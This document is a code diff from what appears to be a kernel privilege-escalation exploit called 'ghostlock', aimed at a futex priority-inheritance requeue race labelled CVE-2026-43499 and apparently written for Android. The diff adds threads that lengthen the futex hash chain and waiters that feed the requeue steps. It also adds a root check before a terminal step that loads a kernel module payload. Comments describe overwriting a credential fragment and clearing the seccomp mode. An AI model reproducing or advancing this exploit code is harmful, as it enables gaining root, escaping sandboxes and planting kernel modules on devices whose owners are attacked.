@@ -148,6 +148,18 @@ namespace {
         ctx->done = 1;
         return nullptr;
     }
+    /** One sleeper of the increase: parks on its own word with a private futex wait, which adds
+     *  one futex_q to the hash bucket of that word in this process. Ported from the retired
+     *  tree's __do_increase, whose doc comment names the bucket as the thing being grown. */
+    struct IncreaseSleeper final {
+        std::uint32_t *word = nullptr;
+    };
+
+    void *increase_sleeper_main(void *argument) {
+        auto *const sleeper = static_cast<IncreaseSleeper *>(argument);
+        (void) ::syscall(SYS_futex, sleeper->word, FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0);
+        return nullptr;
+    }
     struct StubBuckets final {
         /* TEMPORARY, registered with this entry: a rule that answers for one address only.
          *  Accepting everything made the walk answer the first candidate, which is address zero,
@@ -537,6 +549,27 @@ namespace {
          *     W2 overwrites the credential fragment, W3 clears the seccomp mode. TEMPORARY: the waiter
          *     field offsets are the declared layout this run carries; the real path reads them from
          *     the profile like the rest. */
+        /* 12b. The increase. Each of these threads parks with FUTEX_WAIT_PRIVATE on a word of its
+         *      own, and every such wait adds one futex_q to that word hash bucket in this process,
+         *      which is what makes the chain long enough for the race to reach. This is the retired
+         *      tree increase, ported. TEMPORARY: the count and the words are declared here; the real
+         *      path takes both from the profile and the spray. They are not joined on purpose: a
+         *      sleeper that stopped sleeping would shorten the chain again. */
+        constexpr int kSleepers = 64;
+        std::uint32_t sleeper_words[kSleepers] = {};
+        IncreaseSleeper sleepers[kSleepers] = {};
+        pthread_t sleeper_tids[kSleepers] = {};
+        int sleepers_started = 0;
+        for (int i = 0; i < kSleepers; ++i) {
+            sleepers[i].word = &sleeper_words[i];
+            if (::pthread_create(&sleeper_tids[i], nullptr, increase_sleeper_main, &sleepers[i]) ==
+                0) {
+                ++sleepers_started;
+            }
+        }
+        std::printf("run-temp: increase started=%d of=%d (each parks a private futex)\n",
+                    sleepers_started, kSleepers);
+
         /* 12. The handshake, exactly as the probe that ran on this hardware does it: the owner takes
          *     the target first, the waiter parks on the chain asking to be requeued onto the target,
          *     the owner drives the requeue and the kernel reports how many waiters it moved, and the
@@ -584,9 +617,41 @@ namespace {
         std::uint8_t fragment[64] = {};
         backend::cve_2026_43499::race::PiRace<backend::cve_2026_43499::race::LinuxFutexSeam> race;
         backend::cve_2026_43499::race::WindowGuard race_window;
+        std::uint32_t step_target_word = 0U;
+        std::uint32_t step_chain_word = 0U;
+        /* 12c. The waiter the steps need. The owner side of the attempt locks the target and drives
+         *      the requeue; the kernel needs somebody parked on the chain asking to be requeued onto
+         *      the target, and without one it moves none and refuses. This reuses the handshake's own
+         *      waiter, on the two words the action was given. */
+        /* One waiter per attempt: a requeue consumes the waiter it moves, so the second step
+         *  would find none and be refused. The set has three steps, so three threads park on the
+         *  same chain asking for the same target, and each requeue moves one of them. */
+        constexpr int kStepWaiters = 3;
+        HandshakeWaiter step_waiters[kStepWaiters] = {};
+        pthread_t step_waiter_threads[kStepWaiters] = {};
+        int step_waiters_started = 0;
+        for (int i = 0; i < kStepWaiters; ++i) {
+            step_waiters[i].chain = &step_chain_word;
+            step_waiters[i].target = &step_target_word;
+            if (::pthread_create(&step_waiter_threads[i], nullptr, handshake_waiter_main,
+                                 &step_waiters[i]) == 0) {
+                ++step_waiters_started;
+            }
+        }
+        int step_waiters_parked = 0;
+        for (int i = 0; i < kStepWaiters; ++i) {
+            for (int spin = 0; spin < 20000 && step_waiters[i].stage == 0; ++spin) {
+                ::sched_yield();
+            }
+            if (step_waiters[i].stage == 1) {
+                ++step_waiters_parked;
+            }
+        }
+        std::printf("run-temp: step waiters started=%d parked=%d of=%d\n",
+                    step_waiters_started, step_waiters_parked, kStepWaiters);
         backend::cve_2026_43499::steps::RaceAction<backend::cve_2026_43499::race::LinuxFutexSeam> action{
             race, race_window, waiter_offsets, step_targets,
-                                                           fragment, sizeof(fragment), 8U, 0U};
+                                                           fragment, sizeof(fragment), 8U, 0U, &step_chain_word, &step_target_word};
         ghostlock::pipeline::Cve43499W1W3_RootChild<decltype(action)> executor{action};
         /* The window is entered by the caller, which is what makes open_here() true; the guard
          *  reclaims on every exit path from its destructor. */
@@ -602,11 +667,25 @@ namespace {
                     backend::cve_2026_43499::race::race_outcome_name(action.last_race()));
         std::printf("run-temp: step results ok=%d ran=%zu stopped_at=%d\n", ran.steps.ok ? 1 : 0,
                     ran.steps.ran, static_cast<int>(ran.steps.stopped_at));
+        std::printf("run-temp: step waiter results %d %d %d (0 means it was requeued)\n",
+                    step_waiters[0].result, step_waiters[1].result,
+                    step_waiters[2].result);
 
         /* 13. The terminal, reached only when the steps reported success: it is the handoff that
          *     loads the module, and it needs a privilege this run does not have yet. TEMPORARY: the
          *     path is declared here and registered with the rest; the real path takes it from the
          *     selection. */
+        /* The retired tree gates the handoff on ever_rooted and then writes one byte to the
+         *  rooted child. There is no rooted child here yet, so the gate is on the observable
+         *  the same fact leaves behind: the uid this process runs as. When it is not zero the
+         *  terminal says so by the retired tree own words instead of running anything. */
+        const bool ever_rooted = ::getuid() == 0;
+        std::printf("run-temp: terminal gate ever_rooted=%d uid=%d\n", ever_rooted ? 1 : 0,
+                    static_cast<int>(::getuid()));
+        if (!ever_rooted) {
+            std::printf("run-temp: w2 never rooted a child; the terminal is not dispatched\n");
+            return 21;
+        }
         constexpr const char *kDevPayload = "/data/local/tmp/ghostlock.ko";
         if (ran.steps.ok) {
             const ghostlock::terminal::ExecResult executed =
